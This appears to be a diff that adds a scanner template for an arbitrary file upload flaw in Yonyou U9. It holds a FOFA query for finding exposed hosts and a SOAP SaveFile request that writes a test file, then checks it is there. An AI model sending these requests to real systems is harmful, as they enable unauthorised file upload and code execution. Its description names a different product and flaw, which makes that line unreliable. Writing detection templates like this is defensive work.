@@ -1,0 +1,47 @@
+## id: VEID-2024-0204
+## name: 用友系统-U9企业版存在任意文件上传漏洞
+## author: hack007x
+## severity: critical
+## tags: veid,rce,veid2024
+## description:万户OA text2Html接口存在任意文件读取漏洞。
+## fofa-query: title=="        U9-登录    "
+## verification: true
+
+
+POST /CS/Office/AutoUpdates/PatchFile.asmx HTTP/1.1
+Host: {{Hostname}}
+User-Agent: {{random_ua}}
+Cookie: .ASPXANONYMOUS=1OJZqnZ03AEkAAAAZGQ2ZDU0NzYtMDdiZS00YWJhLTk2ZTMtNmRhYTgxNDM5OTNi0; ASP.NET_SessionId=md4bw5fgleu1cxfdwk4w0o4n
+Content-Type: text/xml; charset=utf-8
+
+<?xml version="1.0" encoding="utf-8"?>
+<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+  <soap:Body>
+    <SaveFile xmlns="http://tempuri.org/">
+      <binData>aGVsbG8=</binData>
+      <path>./</path>
+      <fileName>a.txt</fileName>
+    </SaveFile>
+  </soap:Body>
+</soap:Envelope>
+
+#@ condition: and
+#@ matcher: status_code == 200
+#@ matcher: header["Content-Type"] contains "xml" 
+#@ matcher: body contains "<?xml" && body contains "true"
+
+---
+
+GET /CS/Office/AutoUpdates/a.txt HTTP/1.1
+Host: {{Hostname}}
+User-Agent: {{random_ua}}
+
+#@ condition: and
+#@ matcher: status_code == 200
+#@ matcher: body contains "hello"
+
+
+
+
+
+# @VEIL-STAMP: fe67593a053fa76cbd6482a1924c2f312ef21b21776d856ea80172baef83d555
